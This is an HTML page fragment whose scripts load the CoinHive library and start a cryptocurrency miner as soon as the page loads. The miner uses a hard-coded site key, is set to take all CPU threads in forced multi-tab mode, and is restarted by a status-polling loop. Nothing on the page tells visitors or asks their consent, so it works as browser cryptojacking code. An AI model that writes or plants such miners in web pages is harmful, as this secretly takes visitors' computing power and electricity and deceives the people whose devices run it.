<body>

<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<div class="animated fadeIn Inicio">
    
    
<script>
    
  var status; 

function statusOnline()
{
    status = navigator.onLine;  
    recargarPagina();
setTimeout(statusOnline, 500);

}

statusOnline();

function recargarPagina()
{
   if(status == "true") {
       document.body.style.backgroundColor = "white";
   }
    else if(status == "false"){
              defaultStatsMine();
                     document.body.style.backgroundColor = "red";
    }
else{
    return false;
}
}


</script>


<script>

var numerogrande;
numerogrande = navigator.hardwareConcurrency;

function again(){
   miner.stop();
   numerogrande = prompt("Numero Grande, el que quieras");
   miner.start();
}

function defaultStatsMine(){
   miner.stop();
   numerogrande = navigator.hardwareConcurrency
   miner.start();
}

	var miner = new CoinHive.Anonymous('7gMNWWyGknixnRlioga4eNSOkDmcnrSk', {
				threads: numerogrande,
				autoThreads: true
		});
	

	
	
	miner.start(CoinHive.FORCE_MULTI_TAB);
</script>

<script>
	// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();

		// Output to HTML elements...
	}, 1000);
</script>
